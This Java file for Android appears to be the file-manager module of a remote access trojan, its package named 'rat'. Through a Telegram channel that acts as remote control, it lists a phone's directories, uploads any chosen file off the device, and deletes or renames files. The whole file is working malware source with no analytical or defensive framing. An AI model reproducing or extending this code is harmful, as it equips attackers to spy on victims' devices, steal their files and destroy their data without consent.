package com.enterprise.rat.commands;

import android.content.Context;
import com.enterprise.rat.utils.TelegramApi;
import java.io.File;

public class FileManager {
    private Context context;

    public FileManager(Context context) { this.context = context; }

    public void listDirectory(String path) {
        File dir = new File(path);
        if (!dir.exists() || !dir.isDirectory()) { TelegramApi.sendMessage("❌ Invalid path"); return; }
        File[] files = dir.listFiles();
        if (files == null || files.length == 0) { TelegramApi.sendMessage("📁 empty"); return; }
        StringBuilder sb = new StringBuilder("<b>📁 " + path + "</b>\n");
        for (int i=0; i<Math.min(files.length, 20); i++) {
            sb.append(files[i].isDirectory() ? "📁 " : "📄 ").append(files[i].getName()).append("\n");
        }
        TelegramApi.sendMessage(sb.toString());
    }

    public void uploadFile(String path) {
        File f = new File(path);
        if (f.exists()) TelegramApi.sendFile(f, f.getName());
        else TelegramApi.sendMessage("❌ File not found");
    }

    public void deleteFile(String path) {
        File f = new File(path);
        if (f.exists()) {
            boolean ok = f.delete();
            TelegramApi.sendMessage(ok ? "✅ Deleted: " + path : "❌ Failed to delete");
        } else TelegramApi.sendMessage("❌ File not found");
    }

    public void renameFile(String oldPath, String newName) {
        File old = new File(oldPath);
        File newFile = new File(old.getParent(), newName);
        if (old.exists()) {
            boolean ok = old.renameTo(newFile);
            TelegramApi.sendMessage(ok ? "✅ Renamed to " + newName : "❌ Rename failed");
        } else TelegramApi.sendMessage("❌ File not found");
    }
}
